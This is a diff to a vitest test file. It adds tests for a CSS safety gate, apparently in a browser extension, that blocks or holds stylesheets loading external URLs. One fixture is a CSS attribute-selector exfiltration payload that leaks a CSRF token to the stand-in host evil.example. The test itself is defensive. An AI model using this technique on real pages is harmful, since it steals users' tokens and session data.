@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest'
 import { DEFAULT_SETTINGS } from '@shared/types'
-import { checkCssForPage } from '../background/css-gate'
+import { assertPreviewable, checkCssForPage } from '../background/css-gate'
 import { checkCss, hostOfPattern, modeForHost, tokenize } from './css-check'
 
 const PAGE = 'https://shop.example.com/cart'
@@ -261,5 +261,31 @@ describe('checkCssForPage', () => {
     const result = checkCssForPage('a{background:url(https://cdn.example/a.png)}', DEFAULT_SETTINGS, PAGE, undefined)
     expect(result.passed).toBe(false)
     expect(result.static).toHaveLength(1)
+  })
+})
+
+describe('assertPreviewable', () => {
+  const attack = 'input[name=csrf_token][value^="a"] { background: url(https://evil.example/t?a) }'
+
+  it('refuses CSS that fails the check', () => {
+    expect(() => assertPreviewable(attack, DEFAULT_SETTINGS, PAGE, undefined)).toThrow(/load/)
+  })
+
+  it('refuses CSS that is only waiting for approval', () => {
+    const settings = { ...DEFAULT_SETTINGS, cssUrlPolicy: { 'example.com': 'list-external' as const } }
+    expect(() => assertPreviewable(attack, settings, PAGE, undefined)).toThrow(/not approved/)
+  })
+
+  it('allows the same CSS once its address is approved', () => {
+    const settings = { ...DEFAULT_SETTINGS, cssUrlPolicy: { 'example.com': 'list-external' as const } }
+    expect(() =>
+      assertPreviewable(attack, settings, PAGE, ['https://evil.example/t?a']),
+    ).not.toThrow()
+  })
+
+  it('allows ordinary CSS', () => {
+    expect(() =>
+      assertPreviewable('a { color: red; background: linear-gradient(red, blue) }', DEFAULT_SETTINGS, PAGE, undefined),
+    ).not.toThrow()
   })
 })
